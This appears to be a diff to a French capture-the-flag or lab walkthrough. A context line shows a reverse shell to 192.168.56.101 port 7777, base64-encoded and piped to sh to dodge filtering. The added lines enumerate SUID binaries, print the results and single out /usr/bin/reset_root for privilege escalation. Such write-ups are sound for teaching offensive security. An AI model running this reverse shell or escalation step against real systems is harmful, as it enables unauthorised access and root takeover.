@@ -152,3 +152,26 @@ Je vais donc contourner ce problème en encodant ma commande : ```echo "sh -i >&
 
 Puis je l'exécute de cette manière : ```echo "c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC41Ni4xMDEvNzc3NyAwPiYx" | base64 -d | sh```
 
+Ensuite j'exécute la commande ```find / -perm -u=s -type f -ls 2>/dev/null``` qui me donne cette liste de résultats :
+```
+ 12851509     76 -rwsr-xr-x   1 root     root        74208 Aug  9 08:21 /usr/bin/chage
+ 12747606     80 -rwsr-xr-x   1 root     root        78536 Aug  9 08:21 /usr/bin/gpasswd
+ 12747609     44 -rwsr-xr-x   1 root     root        42256 Aug  9 08:21 /usr/bin/newgrp
+ 12851796     60 -rwsr-xr-x   1 root     root        58384 Feb 12  2021 /usr/bin/su
+ 12851780     52 -rwsr-xr-x   1 root     root        49920 Feb 12  2021 /usr/bin/mount
+ 12851799     40 -rwsr-xr-x   1 root     root        37560 Feb 12  2021 /usr/bin/umount
+ 12671177     32 -rwsr-xr-x   1 root     root        32648 Jun  3  2021 /usr/bin/pkexec
+ 13256412     32 -rwsr-xr-x   1 root     root        32712 Jan 30  2021 /usr/bin/passwd
+ 13256418     36 -rws--x--x   1 root     root        33488 Feb 12  2021 /usr/bin/chfn
+ 13256419     28 -rws--x--x   1 root     root        25264 Feb 12  2021 /usr/bin/chsh
+ 13256550     60 -rwsr-xr-x   1 root     root        57432 Jan 26  2021 /usr/bin/at
+ 13258486    184 ---s--x--x   1 root     root       185504 Jan 26  2021 /usr/bin/sudo
+ 12961001     24 -rwsr-xr-x   1 root     root        24552 Oct 12 22:18 /usr/bin/reset_root
+   467872     16 -rwsr-xr-x   1 root     root        15632 Sep 29 18:48 /usr/sbin/grub2-set-bootflag
+   468250     16 -rwsr-xr-x   1 root     root        16096 Jun 10  2021 /usr/sbin/pam_timestamp_check
+   468252     24 -rwsr-xr-x   1 root     root        24552 Jun 10  2021 /usr/sbin/unix_chkpwd
+   879418    116 -rwsr-xr-x   1 root     root       116064 Sep 23 18:06 /usr/sbin/mount.nfs
+  4352689     24 -rwsr-xr-x   1 root     root        24536 Jun  3  2021 /usr/lib/polkit-1/polkit-agent-helper-1
+```
+
+Le fichier ```/usr/bin/reset_root``` semble être une bonne piste !
